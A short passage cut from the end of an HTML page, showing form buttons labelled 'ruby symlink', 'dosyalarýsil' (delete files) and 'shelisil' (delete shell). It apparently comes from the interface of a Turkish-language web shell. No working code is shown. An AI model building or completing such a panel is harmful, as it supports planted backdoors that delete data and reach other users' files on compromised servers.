			  <input type='submit' name='Submit40' value='ruby symlink'>
			  <input type='submit' name='Submit41' value='dosyalarýsil'>
			  <input type='submit' name='Submit42' value='shelisil'>
            </div>
        </form></td>
      </tr>
   <tr>
   
</body>
</html>